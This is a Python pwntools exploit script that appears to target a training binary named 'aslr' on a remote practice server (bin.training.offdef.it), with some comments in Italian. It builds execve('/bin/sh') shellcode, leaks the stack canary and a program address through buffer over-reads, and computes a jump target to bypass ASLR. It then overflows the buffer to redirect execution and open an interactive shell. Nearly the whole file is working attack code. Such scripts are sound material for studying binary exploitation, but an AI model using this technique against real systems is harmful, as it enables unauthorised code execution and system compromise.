from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    r = process("./aslr")
    gdb.attach(r, """
            #b *0x100a94
            b *main +229
            c
                  """)
    input("wait")
else:
    r = remote("bin.training.offdef.it", 2012)

asm_code = """
                jmp SHELLCODE
                RETURN: pop rdi		    
                mov rax,0x3b		    
                mov rsi,0x0
                mov rdx,0x0
                syscall			        
                SHELLCODE: call RETURN	    	           			            
        """

############# SHELLCODE ################
context.arch = 'amd64'
stringa = "/bin/sh"
shellcode = asm(asm_code)
res = shellcode + (b"/bin/sh")
r.sendline(res)

################ LEAK CANARY ################
r.send(b"B"*105)
r.recvuntil(b"> ")
r.read(105)
leaked_canary = b"\x00" + r.read(7)
canary = u64(leaked_canary)

print("[!] leaked_canary %s" % leaked_canary)
print("[!] leaked_canary %#x" % canary)

################ LEAK LIBC ################
r.send(b"A"*136)
r.recvuntil(b"> ")
r.read(136)
leaked_address = r.read(6) + b"\x00\x00"
addr = u64(leaked_address)
print("leaked address %#x" % addr)

# leaked address (address che sta nel programma --> lo vedo con vmmap) in locale
myAddr = int(0x0000558d84e00960)
# indirizzo della ps1 in locale (facendo p &ps1 in gdb)
my_ps1 = int(0x558d85001080)

programOff = my_ps1 - myAddr
print("program offset %d" % int(programOff))

whereToJump = addr + programOff
print("Where to jump %#x" % whereToJump)
wtj = whereToJump.to_bytes(8, byteorder='little')

################ EXPLOIT ################
payload = b"\x90"*104 + leaked_canary + b"B" * \
    8 + wtj
r.send(payload)
time.sleep(0.1)
r.sendline("")

r.interactive()
